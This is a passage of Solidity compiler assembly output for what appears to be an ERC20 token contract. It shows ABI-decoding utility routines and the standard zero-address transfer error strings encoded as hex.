tag_563:\n        /* \"#utility.yul\":4591:4813   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4819:5438   */\n    tag_57:\n        /* \"#utility.yul\":4896:4902   */\n      0x00\n        /* \"#utility.yul\":4904:4910   */\n      dup1\n        /* \"#utility.yul\":4912:4918   */\n      0x00\n        /* \"#utility.yul\":4961:4963   */\n      0x60\n        /* \"#utility.yul\":4949:4958   */\n      dup5\n        /* \"#utility.yul\":4940:4947   */\n      dup7\n        /* \"#utility.yul\":4936:4959   */\n      sub\n        /* \"#utility.yul\":4932:4964   */\n      slt\n        /* \"#utility.yul\":4929:5048   */\n      iszero\n      tag_565\n      jumpi\n        /* \"#utility.yul\":4967:5046   */\n      tag_566\n      tag_436\n      jump\t// in\n    tag_566:\n        /* \"#utility.yul\":4929:5048   */\n    tag_565:\n        /* \"#utility.yul\":5087:5088   */\n      0x00\n        /* \"#utility.yul\":5112:5165   */\n      tag_567\n        /* \"#utility.yul\":5157:5164   */\n      dup7\n        /* \"#utility.yul\":5148:5154   */\n      dup3\n        /* \"#utility.yul\":5137:5146   */\n      dup8\n        /* \"#utility.yul\":5133:5155   */\n      add\n        /* \"#utility.yul\":5112:5165   */\n      tag_441\n      jump\t// in\n    tag_567:\n        /* \"#utility.yul\":5102:5165   */\n      swap4\n      pop\n        /* \"#utility.yul\":5058:5175   */\n      pop\n        /* \"#utility.yul\":5214:5216   */\n      0x20\n        /* \"#utility.yul\":5240:5293   */\n      tag_568\n        /* \"#utility.yul\":5285:5292   */\n      dup7\n        /* \"#utility.yul\":5276:5282   */\n      dup3\n        /* \"#utility.yul\":5265:5274   */\n      dup8\n        /* \"#utility.yul\":5261:5283   */\n      add\n        /* \"#utility.yul\":5240:5293   */\n      tag_441\n      jump\t// in\n    tag_568:\n        /* \"#utility.yul\":5230:5293   */\n      swap3\n      pop\n        /* \"#utility.yul\":5185:5303   */\n      pop\n        /* \"#utility.yul\":5342:5344   */\n      0x40\n        /* \"#utility.yul\":5368:5421   */\n      tag_569\n        /* \"#utility.yul\":5413:5420   */\n      dup7\n        /* \"#utility.yul\":5404:5410   */\n      dup3\n        /* \"#utility.yul\":5393:5402   */\n      dup8\n        /* \"#utility.yul\":5389:5411   */\n      add\n        /* \"#utility.yul\":5368:5421   */\n      tag_444\n      jump\t// in\n    tag_569:\n        /* \"#utility.yul\":5358:5421   */\n      swap2\n      pop\n        /* \"#utility.yul\":5313:5431   */\n      pop\n        /* \"#utility.yul\":4819:5438   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":5444:5530   */\n    tag_453:\n        /* \"#utility.yul\":5479:5486   */\n      0x00\n        /* \"#utility.yul\":5519:5523   */\n      0xff\n        /* \"#utility.yul\":5512:5517   */\n      dup3\n        /* \"#utility.yul\":5508:5524   */\n      and\n        /* \"#utility.yul\":5497:5524   */\n      swap1\n      pop\n        /* \"#utility.yul\":5444:5530   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5536:5648   */\n    tag_454:\n        /* \"#utility.yul\":5619:5641   */\n      tag_572\n        /* \"#utility.yul\":5635:5640   */\n      dup2\n        /* \"#utility.yul\":5619:5641   */\n      tag_453\n      jump\t// in\n    tag_572:\n        /* \"#utility.yul\":5614:5617   */\n      dup3\n        /* \"#utility.yul\":5607:5642   */\n      mstore\n        /* \"#utility.yul\":5536:5648   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5654:5868   */\n    tag_64:\n        /* \"#utility.yul\":5743:5747   */\n      0x00\n        /* \"#utility.yul\":5781:5783   */\n      0x20\n        /* \"#utility.yul\":5770:5779   */\n      dup3\n        /* \"#utility.yul\":5766:5784   */\n      add\n        /* \"#utility.yul\":5758:5784   */\n      swap1\n      pop\n        /* \"#utility.yul\":5794:5861   */\n      tag_574\n        /* \"#utility.yul\":5858:5859   */\n      0x00\n        /* \"#utility.yul\":5847:5856   */\n      dup4\n        /* \"#utility.yul\":5843:5860   */\n      add\n        /* \"#utility.yul\":5834:5840   */\n      dup5\n        /* \"#utility.yul\":5794:5861   */\n      tag_454\n      jump\t// in\n    tag_574:\n        /* \"#utility.yul\":5654:5868   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5874:5992   */\n    tag_455:\n        /* \"#utility.yul\":5961:5985   */\n      tag_576\n        /* \"#utility.yul\":5979:5984   */\n      dup2\n        /* \"#utility.yul\":5961:5985   */\n      tag_439\n      jump\t// in\n    tag_576:\n        /* \"#utility.yul\":5956:5959   */\n      dup3\n        /* \"#utility.yul\":5949:5986   */\n      mstore\n        /* \"#utility.yul\":5874:5992   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5998:6220   */\n    tag_69:\n        /* \"#utility.yul\":6091:6095   */\n      0x00\n        /* \"#utility.yul\":6129:6131   */\n      0x20\n        /* \"#utility.yul\":6118:6127   */\n      dup3\n        /* \"#utility.yul\":6114:6132   */\n      add\n        /* \"#utility.yul\":6106:6132   */\n      swap1\n      pop\n        /* \"#utility.yul\":6142:6213   */\n      tag_578\n        /* \"#utility.yul\":6210:6211   */\n      0x00\n        /* \"#utility.yul\":6199:6208   */\n      dup4\n        /* \"#utility.yul\":6195:6212   */\n      add\n        /* \"#utility.yul\":6186:6192   */\n      dup5\n        /* \"#utility.yul\":6142:6213   */\n      tag_455\n      jump\t// in\n    tag_578:\n        /* \"#utility.yul\":5998:6220   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6226:6376   */\n    tag_456:\n        /* \"#utility.yul\":6300:6309   */\n      0x00\n        /* \"#utility.yul\":6333:6370   */\n      tag_580\n        /* \"#utility.yul\":6364:6369   */\n      dup3\n        /* \"#utility.yul\":6333:6370   */\n      tag_449\n      jump\t// in\n    tag_580:\n        /* \"#utility.yul\":6320:6370   */\n      swap1\n      pop\n        /* \"#utility.yul\":6226:6376   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6382:6561   */\n    tag_457:\n        /* \"#utility.yul\":6493:6554   */\n      tag_582\n        /* \"#utility.yul\":6548:6553   */\n      dup2\n        /* \"#utility.yul\":6493:6554   */\n      tag_456\n      jump\t// in\n    tag_582:\n        /* \"#utility.yul\":6488:6491   */\n      dup3\n        /* \"#utility.yul\":6481:6555   */\n      mstore\n        /* \"#utility.yul\":6382:6561   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6567:6837   */\n    tag_78:\n        /* \"#utility.yul\":6684:6688   */\n      0x00\n        /* \"#utility.yul\":6722:6724   */\n      0x20\n        /* \"#utility.yul\":6711:6720   */\n      dup3\n        /* \"#utility.yul\":6707:6725   */\n      add\n        /* \"#utility.yul\":6699:6725   */\n      swap1\n      pop\n        /* \"#utility.yul\":6735:6830   */\n      tag_584\n        /* \"#utility.yul\":6827:6828   */\n      0x00\n        /* \"#utility.yul\":6816:6825   */\n      dup4\n        /* \"#utility.yul\":6812:6829   */\n      add\n        /* \"#utility.yul\":6803:6809   */\n      dup5\n        /* \"#utility.yul\":6735:6830   */\n      tag_457\n      jump\t// in\n    tag_584:\n        /* \"#utility.yul\":6567:6837   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6843:6959   */\n    tag_458:\n        /* \"#utility.yul\":6913:6934   */\n      tag_586\n        /* \"#utility.yul\":6928:6933   */\n      dup2\n        /* \"#utility.yul\":6913:6934   */\n      tag_445\n      jump\t// in\n    tag_586:\n        /* \"#utility.yul\":6906:6911   */\n      dup2\n        /* \"#utility.yul\":6903:6935   */\n      eq\n        /* \"#utility.yul\":6893:6953   */\n      tag_587\n      jumpi\n        /* \"#utility.yul\":6949:6950   */\n      0x00\n        /* \"#utility.yul\":6946:6947   */\n      dup1\n        /* \"#utility.yul\":6939:6951   */\n      revert\n        /* \"#utility.yul\":6893:6953   */\n    tag_587:\n        /* \"#utility.yul\":6843:6959   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6965:7098   */\n    tag_459:\n        /* \"#utility.yul\":7008:7013   */\n      0x00\n        /* \"#utility.yul\":7046:7052   */\n      dup2\n        /* \"#utility.yul\":7033:7053   */\n      calldataload\n        /* \"#utility.yul\":7024:7053   */\n      swap1\n      pop\n        /* \"#utility.yul\":7062:7092   */\n      tag_589\n        /* \"#utility.yul\":7086:7091   */\n      dup2\n        /* \"#utility.yul\":7062:7092   */\n      tag_458\n      jump\t// in\n    tag_589:\n        /* \"#utility.yul\":6965:7098   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7104:7427   */\n    tag_82:\n        /* \"#utility.yul\":7160:7166   */\n      0x00\n        /* \"#utility.yul\":7209:7211   */\n      0x20\n        /* \"#utility.yul\":7197:7206   */\n      dup3\n        /* \"#utility.yul\":7188:7195   */\n      dup5\n        /* \"#utility.yul\":7184:7207   */\n      sub\n        /* \"#utility.yul\":7180:7212   */\n      slt\n        /* \"#utility.yul\":7177:7296   */\n      iszero\n      tag_591\n      jumpi\n        /* \"#utility.yul\":7215:7294   */\n      tag_592\n      tag_436\n      jump\t// in\n    tag_592:\n        /* \"#utility.yul\":7177:7296   */\n    tag_591:\n        /* \"#utility.yul\":7335:7336   */\n      0x00\n        /* \"#utility.yul\":7360:7410   */\n      tag_593\n        /* \"#utility.yul\":7402:7409   */\n      dup5\n        /* \"#utility.yul\":7393:7399   */\n      dup3\n        /* \"#utility.yul\":7382:7391   */\n      dup6\n        /* \"#utility.yul\":7378:7400   */\n      add\n        /* \"#utility.yul\":7360:7410   */\n      tag_459\n      jump\t// in\n    tag_593:\n        /* \"#utility.yul\":7350:7410   */\n      swap2\n      pop\n        /* \"#utility.yul\":7306:7420   */\n      pop\n        /* \"#utility.yul\":7104:7427   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7433:7762   */\n    tag_90:\n        /* \"#utility.yul\":7492:7498   */\n      0x00\n        /* \"#utility.yul\":7541:7543   */\n      0x20\n        /* \"#utility.yul\":7529:7538   */\n      dup3\n        /* \"#utility.yul\":7520:7527   */\n      dup5\n        /* \"#utility.yul\":7516:7539   */\n      sub\n        /* \"#utility.yul\":7512:7544   */\n      slt\n        /* \"#utility.yul\":7509:7628   */\n      iszero\n      tag_595\n      jumpi\n        /* \"#utility.yul\":7547:7626   */\n      tag_596\n      tag_436\n      jump\t// in\n    tag_596:\n        /* \"#utility.yul\":7509:7628   */\n    tag_595:\n        /* \"#utility.yul\":7667:7668   */\n      0x00\n        /* \"#utility.yul\":7692:7745   */\n      tag_597\n        /* \"#utility.yul\":7737:7744   */\n      dup5\n        /* \"#utility.yul\":7728:7734   */\n      dup3\n        /* \"#utility.yul\":7717:7726   */\n      dup6\n        /* \"#utility.yul\":7713:7735   */\n      add\n        /* \"#utility.yul\":7692:7745   */\n      tag_441\n      jump\t// in\n    tag_597:\n        /* \"#utility.yul\":7682:7745   */\n      swap2\n      pop\n        /* \"#utility.yul\":7638:7755   */\n      pop\n        /* \"#utility.yul\":7433:7762   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7768:7872   */\n    tag_460:\n        /* \"#utility.yul\":7813:7820   */\n      0x00\n        /* \"#utility.yul\":7842:7866   */\n      tag_599\n        /* \"#utility.yul\":7860:7865   */\n      dup3\n        /* \"#utility.yul\":7842:7866   */\n      tag_438\n      jump\t// in\n    tag_599:\n        /* \"#utility.yul\":7831:7866   */\n      swap1\n      pop\n        /* \"#utility.yul\":7768:7872   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7878:8016   */\n    tag_461:\n        /* \"#utility.yul\":7959:7991   */\n      tag_601\n        /* \"#utility.yul\":7985:7990   */\n      dup2\n        /* \"#utility.yul\":7959:7991   */\n      tag_460\n      jump\t// in\n    tag_601:\n        /* \"#utility.yul\":7952:7957   */\n      dup2\n        /* \"#utility.yul\":7949:7992   */\n      eq\n        /* \"#utility.yul\":7939:8010   */\n      tag_602\n      jumpi\n        /* \"#utility.yul\":8006:8007   */\n      0x00\n        /* \"#utility.yul\":8003:8004   */\n      dup1\n        /* \"#utility.yul\":7996:8008   */\n      revert\n        /* \"#utility.yul\":7939:8010   */\n    tag_602:\n        /* \"#utility.yul\":7878:8016   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8022:8177   */\n    tag_462:\n        /* \"#utility.yul\":8076:8081   */\n      0x00\n        /* \"#utility.yul\":8114:8120   */\n      dup2\n        /* \"#utility.yul\":8101:8121   */\n      calldataload\n        /* \"#utility.yul\":8092:8121   */\n      swap1\n      pop\n        /* \"#utility.yul\":8130:8171   */\n      tag_604\n        /* \"#utility.yul\":8165:8170   */\n      dup2\n        /* \"#utility.yul\":8130:8171   */\n      tag_461\n      jump\t// in\n    tag_604:\n        /* \"#utility.yul\":8022:8177   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8183:8528   */\n    tag_99:\n        /* \"#utility.yul\":8250:8256   */\n      0x00\n        /* \"#utility.yul\":8299:8301   */\n      0x20\n        /* \"#utility.yul\":8287:8296   */\n      dup3\n        /* \"#utility.yul\":8278:8285   */\n      dup5\n        /* \"#utility.yul\":8274:8297   */\n      sub\n        /* \"#utility.yul\":8270:8302   */\n      slt\n        /* \"#utility.yul\":8267:8386   */\n      iszero\n      tag_606\n      jumpi\n        /* \"#utility.yul\":8305:8384   */\n      tag_607\n      tag_436\n      jump\t// in\n    tag_607:\n        /* \"#utility.yul\":8267:8386   */\n    tag_606:\n        /* \"#utility.yul\":8425:8426   */\n      0x00\n        /* \"#utility.yul\":8450:8511   */\n      tag_608\n        /* \"#utility.yul\":8503:8510   */\n      dup5\n        /* \"#utility.yul\":8494:8500   */\n      dup3\n        /* \"#utility.yul\":8483:8492   */\n      dup6\n        /* \"#utility.yul\":8479:8501   */\n      add\n        /* \"#utility.yul\":8450:8511   */\n      tag_462\n      jump\t// in\n    tag_608:\n        /* \"#utility.yul\":8440:8511   */\n      swap2\n      pop\n        /* \"#utility.yul\":8396:8521   */\n      pop\n        /* \"#utility.yul\":8183:8528   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8534:9299   */\n    tag_112:\n        /* \"#utility.yul\":8620:8626   */\n      0x00\n        /* \"#utility.yul\":8628:8634   */\n      dup1\n        /* \"#utility.yul\":8636:8642   */\n      0x00\n        /* \"#utility.yul\":8644:8650   */\n      dup1\n        /* \"#utility.yul\":8693:8696   */\n      0x80\n        /* \"#utility.yul\":8681:8690   */\n      dup6\n        /* \"#utility.yul\":8672:8679   */\n      dup8\n        /* \"#utility.yul\":8668:8691   */\n      sub\n        /* \"#utility.yul\":8664:8697   */\n      slt\n        /* \"#utility.yul\":8661:8781   */\n      iszero\n      tag_610\n      jumpi\n        /* \"#utility.yul\":8700:8779   */\n      tag_611\n      tag_436\n      jump\t// in\n    tag_611:\n        /* \"#utility.yul\":8661:8781   */\n    tag_610:\n        /* \"#utility.yul\":8820:8821   */\n      0x00\n        /* \"#utility.yul\":8845:8898   */\n      tag_612\n        /* \"#utility.yul\":8890:8897   */\n      dup8\n        /* \"#utility.yul\":8881:8887   */\n      dup3\n        /* \"#utility.yul\":8870:8879   */\n      dup9\n        /* \"#utility.yul\":8866:8888   */\n      add\n        /* \"#utility.yul\":8845:8898   */\n      tag_444\n      jump\t// in\n    tag_612:\n        /* \"#utility.yul\":8835:8898   */\n      swap5\n      pop\n        /* \"#utility.yul\":8791:8908   */\n      pop\n        /* \"#utility.yul\":8947:8949   */\n      0x20\n        /* \"#utility.yul\":8973:9026   */\n      tag_613\n        /* \"#utility.yul\":9018:9025   */\n      dup8\n        /* \"#utility.yul\":9009:9015   */\n      dup3\n        /* \"#utility.yul\":8998:9007   */\n      dup9\n        /* \"#utility.yul\":8994:9016   */\n      add\n        /* \"#utility.yul\":8973:9026   */\n      tag_444\n      jump\t// in\n    tag_613:\n        /* \"#utility.yul\":8963:9026   */\n      swap4\n      pop\n        /* \"#utility.yul\":8918:9036   */\n      pop\n        /* \"#utility.yul\":9075:9077   */\n      0x40\n        /* \"#utility.yul\":9101:9154   */\n      tag_614\n        /* \"#utility.yul\":9146:9153   */\n      dup8\n        /* \"#utility.yul\":9137:9143   */\n      dup3\n        /* \"#utility.yul\":9126:9135   */\n      dup9\n        /* \"#utility.yul\":9122:9144   */\n      add\n        /* \"#utility.yul\":9101:9154   */\n      tag_444\n      jump\t// in\n    tag_614:\n        /* \"#utility.yul\":9091:9154   */\n      swap3\n      pop\n        /* \"#utility.yul\":9046:9164   */\n      pop\n        /* \"#utility.yul\":9203:9205   */\n      0x60\n        /* \"#utility.yul\":9229:9282   */\n      tag_615\n        /* \"#utility.yul\":9274:9281   */\n      dup8\n        /* \"#utility.yul\":9265:9271   */\n      dup3\n        /* \"#utility.yul\":9254:9263   */\n      dup9\n        /* \"#utility.yul\":9250:9272   */\n      add\n        /* \"#utility.yul\":9229:9282   */\n      tag_444\n      jump\t// in\n    tag_615:\n        /* \"#utility.yul\":9219:9282   */\n      swap2\n      pop\n        /* \"#utility.yul\":9174:9292   */\n      pop\n        /* \"#utility.yul\":8534:9299   */\n      swap3\n      swap6\n      swap2\n      swap5\n      pop\n      swap3\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9305:9422   */\n    tag_463:\n        /* \"#utility.yul\":9414:9415   */\n      0x00\n        /* \"#utility.yul\":9411:9412   */\n      dup1\n        /* \"#utility.yul\":9404:9416   */\n      revert\n        /* \"#utility.yul\":9428:9545   */\n    tag_464:\n        /* \"#utility.yul\":9537:9538   */\n      0x00\n        /* \"#utility.yul\":9534:9535   */\n      dup1\n        /* \"#utility.yul\":9527:9539   */\n      revert\n        /* \"#utility.yul\":9551:9668   */\n    tag_465:\n        /* \"#utility.yul\":9660:9661   */\n      0x00\n        /* \"#utility.yul\":9657:9658   */\n      dup1\n        /* \"#utility.yul\":9650:9662   */\n      revert\n        /* \"#utility.yul\":9691:10259   */\n    tag_466:\n        /* \"#utility.yul\":9764:9772   */\n      0x00\n        /* \"#utility.yul\":9774:9780   */\n      dup1\n        /* \"#utility.yul\":9824:9827   */\n      dup4\n        /* \"#utility.yul\":9817:9821   */\n      0x1f\n        /* \"#utility.yul\":9809:9815   */\n      dup5\n        /* \"#utility.yul\":9805:9822   */\n      add\n        /* \"#utility.yul\":9801:9828   */\n      slt\n        /* \"#utility.yul\":9791:9913   */\n      tag_620\n      jumpi\n        /* \"#utility.yul\":9832:9911   */\n      tag_621\n      tag_463\n      jump\t// in\n    tag_621:\n        /* \"#utility.yul\":9791:9913   */\n    tag_620:\n        /* \"#utility.yul\":9945:9951   */\n      dup3\n        /* \"#utility.yul\":9932:9952   */\n      calldataload\n        /* \"#utility.yul\":9922:9952   */\n      swap1\n      pop\n        /* \"#utility.yul\":9975:9993   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":9967:9973   */\n      dup2\n        /* \"#utility.yul\":9964:9994   */\n      gt\n        /* \"#utility.yul\":9961:10078   */\n      iszero\n      tag_622\n      jumpi\n        /* \"#utility.yul\":9997:10076   */\n      tag_623\n      tag_464\n      jump\t// in\n    tag_623:\n        /* \"#utility.yul\":9961:10078   */\n    tag_622:\n        /* \"#utility.yul\":10111:10115   */\n      0x20\n        /* \"#utility.yul\":10103:10109   */\n      dup4\n        /* \"#utility.yul\":10099:10116   */\n      add\n        /* \"#utility.yul\":10087:10116   */\n      swap2\n      pop\n        /* \"#utility.yul\":10165:10168   */\n      dup4\n        /* \"#utility.yul\":10157:10161   */\n      0x20\n        /* \"#utility.yul\":10149:10155   */\n      dup3\n        /* \"#utility.yul\":10145:10162   */\n      mul\n        /* \"#utility.yul\":10135:10143   */\n      dup4\n        /* \"#utility.yul\":10131:10163   */\n      add\n        /* \"#utility.yul\":10128:10169   */\n      gt\n        /* \"#utility.yul\":10125:10253   */\n      iszero\n      tag_624\n      jumpi\n        /* \"#utility.yul\":10172:10251   */\n      tag_625\n      tag_465\n      jump\t// in\n    tag_625:\n        /* \"#utility.yul\":10125:10253   */\n    tag_624:\n        /* \"#utility.yul\":9691:10259   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10265:10963   */\n    tag_129:\n        /* \"#utility.yul\":10357:10363   */\n      0x00\n        /* \"#utility.yul\":10365:10371   */\n      dup1\n        /* \"#utility.yul\":10373:10379   */\n      0x00\n        /* \"#utility.yul\":10422:10424   */\n      0x40\n        /* \"#utility.yul\":10410:10419   */\n      dup5\n        /* \"#utility.yul\":10401:10408   */\n      dup7\n        /* \"#utility.yul\":10397:10420   */\n      sub\n        /* \"#utility.yul\":10393:10425   */\n      slt\n        /* \"#utility.yul\":10390:10509   */\n      iszero\n      tag_627\n      jumpi\n        /* \"#utility.yul\":10428:10507   */\n      tag_628\n      tag_436\n      jump\t// in\n    tag_628:\n        /* \"#utility.yul\":10390:10509   */\n    tag_627:\n        /* \"#utility.yul\":10576:10577   */\n      0x00\n        /* \"#utility.yul\":10565:10574   */\n      dup5\n        /* \"#utility.yul\":10561:10578   */\n      add\n        /* \"#utility.yul\":10548:10579   */\n      calldataload\n        /* \"#utility.yul\":10606:10624   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":10598:10604   */\n      dup2\n        /* \"#utility.yul\":10595:10625   */\n      gt\n        /* \"#utility.yul\":10592:10709   */\n      iszero\n      tag_629\n      jumpi\n        /* \"#utility.yul\":10628:10707   */\n      tag_630\n      tag_437\n      jump\t// in\n    tag_630:\n        /* \"#utility.yul\":10592:10709   */\n    tag_629:\n        /* \"#utility.yul\":10741:10821   */\n      tag_631\n        /* \"#utility.yul\":10813:10820   */\n      dup7\n        /* \"#utility.yul\":10804:10810   */\n      dup3\n        /* \"#utility.yul\":10793:10802   */\n      dup8\n        /* \"#utility.yul\":10789:10811   */\n      add\n        /* \"#utility.yul\":10741:10821   */\n      tag_466\n      jump\t// in\n    tag_631:\n        /* \"#utility.yul\":10723:10821   */\n      swap4\n      pop\n      swap4\n      pop\n        /* \"#utility.yul\":10519:10831   */\n      pop\n        /* \"#utility.yul\":10870:10872   */\n      0x20\n        /* \"#utility.yul\":10896:10946   */\n      tag_632\n        /* \"#utility.yul\":10938:10945   */\n      dup7\n        /* \"#utility.yul\":10929:10935   */\n      dup3\n        /* \"#utility.yul\":10918:10927   */\n      dup8\n        /* \"#utility.yul\":10914:10936   */\n      add\n        /* \"#utility.yul\":10896:10946   */\n      tag_459\n      jump\t// in\n    tag_632:\n        /* \"#utility.yul\":10886:10946   */\n      swap2\n      pop\n        /* \"#utility.yul\":10841:10956   */\n      pop\n        /* \"#utility.yul\":10265:10963   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":10969:11443   */\n    tag_138:\n        /* \"#utility.yul\":11037:11043   */\n      0x00\n        /* \"#utility.yul\":11045:11051   */\n      dup1\n        /* \"#utility.yul\":11094:11096   */\n      0x40\n        /* \"#utility.yul\":11082:11091   */\n      dup4\n        /* \"#utility.yul\":11073:11080   */\n      dup6\n        /* \"#utility.yul\":11069:11092   */\n      sub\n        /* \"#utility.yul\":11065:11097   */\n      slt\n        /* \"#utility.yul\":11062:11181   */\n      iszero\n      tag_634\n      jumpi\n        /* \"#utility.yul\":11100:11179   */\n      tag_635\n      tag_436\n      jump\t// in\n    tag_635:\n        /* \"#utility.yul\":11062:11181   */\n    tag_634:\n        /* \"#utility.yul\":11220:11221   */\n      0x00\n        /* \"#utility.yul\":11245:11298   */\n      tag_636\n        /* \"#utility.yul\":11290:11297   */\n      dup6\n        /* \"#utility.yul\":11281:11287   */\n      dup3\n        /* \"#utility.yul\":11270:11279   */\n      dup7\n        /* \"#utility.yul\":11266:11288   */\n      add\n        /* \"#utility.yul\":11245:11298   */\n      tag_441\n      jump\t// in\n    tag_636:\n        /* \"#utility.yul\":11235:11298   */\n      swap3\n      pop\n        /* \"#utility.yul\":11191:11308   */\n      pop\n        /* \"#utility.yul\":11347:11349   */\n      0x20\n        /* \"#utility.yul\":11373:11426   */\n      tag_637\n        /* \"#utility.yul\":11418:11425   */\n      dup6\n        /* \"#utility.yul\":11409:11415   */\n      dup3\n        /* \"#utility.yul\":11398:11407   */\n      dup7\n        /* \"#utility.yul\":11394:11416   */\n      add\n        /* \"#utility.yul\":11373:11426   */\n      tag_441\n      jump\t// in\n    tag_637:\n        /* \"#utility.yul\":11363:11426   */\n      swap2\n      pop\n        /* \"#utility.yul\":11318:11436   */\n      pop\n        /* \"#utility.yul\":10969:11443   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11449:11673   */\n    tag_467:\n        /* \"#utility.yul\":11589:11623   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":11585:11586   */\n      0x00\n        /* \"#utility.yul\":11577:11583   */\n      dup3\n        /* \"#utility.yul\":11573:11587   */\n      add\n        /* \"#utility.yul\":11566:11624   */\n      mstore\n        /* \"#utility.yul\":11658:11665   */\n      0x6472657373000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":11653:11655   */\n      0x20\n        /* \"#utility.yul\":11645:11651   */\n      dup3\n        /* \"#utility.yul\":11641:11656   */\n      add\n        /* \"#utility.yul\":11634:11666   */\n      mstore\n        /* \"#utility.yul\":11449:11673   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11679:12045   */\n    tag_468:\n        /* \"#utility.yul\":11821:11824   */\n      0x00\n        /* \"#utility.yul\":11842:11909   */\n      tag_640\n        /* \"#utility.yul\":11906:11908   */\n      0x25\n        /* \"#utility.yul\":11901:11904   */\n      dup4\n        /* \"#utility.yul\":11842:11909   */\n      tag_431\n      jump\t// in\n    tag_640:\n        /* \"#utility.yul\":11835:11909   */\n      swap2\n      pop\n        /* \"#utility.yul\":11918:12011   */\n      tag_641\n        /* \"#utility.yul\":12007:12010   */\n      dup3\n        /* \"#utility.yul\":11918:12011   */\n      tag_467\n      jump\t// in\n    tag_641:\n        /* \"#utility.yul\":12036:12038   */\n      0x40\n        /* \"#utility.yul\":12031:12034   */\n      dup3\n        /* \"#utility.yul\":12027:12039   */\n      add\n        /* \"#utility.yul\":12020:12039   */\n      swap1\n      pop\n        /* \"#utility.yul\":11679:12045   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":12051:12470   */\n    tag_164:\n        /* \"#utility.yul\":12217:12221   */\n      0x00\n        /* \"#utility.yul\":12255:12257   */\n      0x20\n        /* \"#utility.yul\":12244:12253   */\n      dup3\n        /* \"#utility.yul\":12240:12258   */\n      add\n        /* \"#utility.yul\":12232:12258   */\n      swap1\n      pop\n        /* \"#utility.yul\":12304:12313   */\n      dup2\n        /* \"#utility.yul\":12298:12302   */\n      dup2\n        /* \"#utility.yul\":12294:12314   */\n      sub\n        /* \"#utility.yul\":12290:12291   */\n      0x00\n        /* \"#utility.yul\":12279:12288   */\n      dup4\n        /* \"#utility.yul\":12275:12292   */\n      add\n        /* \"#utility.yul\":12268:12315   */\n      mstore\n        /* \"#utility.yul\":12332:12463   */\n      tag_643\n        /* \"#utility.yul\":12458:12462   */\n      dup2\n        /* \"#utility.yul\":12332:12463   */\n      tag_468\n      jump\t// in\n    tag_643:\n        /* \"#utility.yul\":12324:12463   */\n      swap1\n      pop\n        /* \"#utility.yul\":12051:12470   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":12476:12698   */\n    tag_469:\n        /* \"#utility.yul\":12616:12650   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":12612:12613   */\n      0x00\n        /* \"#utility.yul\":12604:12610   */\n      dup3\n        /* \"#utility.yul\":12600:12614   */\n      add\n        /* \"#utility.yul\":12593:12651   */\n      mstore\n        /* \"#utility.yul\":12685:12690   */\n      0x6573730000000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":12680:12682   */\n      0x20\n        /* \"#utility.yul\":12672:12678   */\n      dup3\n        /* \"#utility.yul\":12668:12683   */\n      add\n        /* \"#utility.yul\":12661:12691   */\n      mstore\n        /* \"#utility.yul\":12476:12698   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":12704:13070   */\n    tag_470:\n        /* \"#utility.yul\":12846:12849   */\n      0x00\n        /* \"#utility.yul\":12867:12934   */\n      tag_646\n        /* \"#utility.yul\":12931:12933   */\n      0x23\n        /* \"#utility.yul\":12926:12929   */\n      dup4\n        /* \"#utility.yul\":12867:12934   */\n      tag_431\n      jump\t// in\n    tag_646:\n        /* \"#utility.yul\":12860:12934   */\n      swap2\n      pop\n        /* \"#utility.yul\":12943:13036   */\n      tag_647\n        /* \"#utility.yul\":13032:13035   */\n      dup3\n        /* \"#utility.yul\":12943:13036   */\n      tag_469\n      jump\t// in\n    tag_647:\n        /* \"#utility.yul\":13061:13063   */\n      0x40\n        /* \"#utility.yul\":13056:13059   */\n      dup3\n        /* \"#utility.yul\":13052:13064   */\n      add\n        /* \"#utility.yul\":13045:13064   */\n      swap1\n      pop\n        /* \"#utility.yul\":12704:13070   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":13076:13495   */\n    tag_167:\n        /* \"#utility.yul\":13242:13246   */\n      0x00\n        /* \"#utility.yul\":13280:13282   */\n      0x20\n        /* \"#utility.yul\":13269:13278   */\n      dup3\n        /* \"#utility.yul\":13265:13283   */\n      add\n        /* \"#utility.yul\":13257:13283   */\n      